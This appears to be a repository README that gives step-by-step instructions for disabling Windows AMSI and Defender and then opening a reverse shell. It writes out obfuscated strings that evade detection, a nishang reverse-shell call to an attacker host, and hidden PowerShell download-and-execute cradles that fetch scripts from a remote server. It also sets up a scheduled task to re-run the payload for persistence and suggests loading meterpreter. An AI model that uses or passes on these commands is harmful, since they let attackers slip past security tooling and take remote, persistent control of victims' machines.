# Windows-AMSI-Defender-Bypass

::::Bypassing AMSI and getting a Reverse Shell
------------------------------------------------------------------------------------

To make all these things work, I used a script that disables the AMSI:
From : https://amsi.fail

You can generate your own, but make sure it works.
-------------------------------------------------------------------------------------
AMSI fail script,
-----------------
fail.ps1:
---------
some of those generated scripts uses the "Amsi Utils", but it gets caught by the AMSI, so i defined it outside of the code
like this:

$am='Amsi'+'U'+'til'+'s' 

--------------------------------------------------------------------------------------------
Getting the shell:
-------------------
nish.ps1: 
-----------
the TCP nishang that we always use from: https://github.com/samratashok/nishang/tree/master/Shells

definning this at the end of the script

Invoke-PowerShellTcp -Reverse -IPAddress example.attacker.net -Port 443 

------------------------------------------------------------------------------------------------
Running all in one:
-------------------
trigger.ps1:  
------------
This script is going to be the trigger for the 2 invokes(fail.ps1, nish.ps1), it also defines the $am of fail.ps1:

$n = (new-object net.webClient);$am='Amsi'+'U'+'til'+'s';iex ($n).DownloadString('http://example.ddns.net:80/fail.ps1');iex ($n).DownloadString('http://example.ddns.net:80/nish.ps1')

------------------------------------------------------------------------------------------------------------------------------------------------

Finally we just need to do a Invoke-Expression of the trigger:
--------------------------------------------------------------
powershell -windowstyle hidden iex(new-object net.webclient).DownloadString('htt'+'p:/'+'/example.ddns.net:80/trigger.ps1')

Every child process running from this powershell session is going to run without the AMSI, so could easily run a meterpreter from this, but make sure to obfucate it because meterpreter is way more intrusive.


---------------------------------------------

---------------------------------------------

To add an extra
-----------------
we can make it all run as many time as we want by scheduling these Invokes-Expression's:

sched.ps1:
----------
You can modify this to run whenever you want, in (New-TimeSpan -Minutes 'minutes between each run')

so in this case you are going to run 2 Invokes:
          
          
powershell -windowstyle hidden iex(new-object net.webclient).DownloadString('htt'+'p:/'+'/example.ddns.net:80/trigger.ps1')
powershell -windowstyle hidden iex(new-object net.webclient).DownloadString('htt'+'p:/'+'/example.ddns.net:80/sched.ps1')

You can make only one call by creating another .ps1

All of these scripts are goint to be in: 
----------------------------------------
https://github.com/Filiplain/Windows-AMSI-Defender-Bypass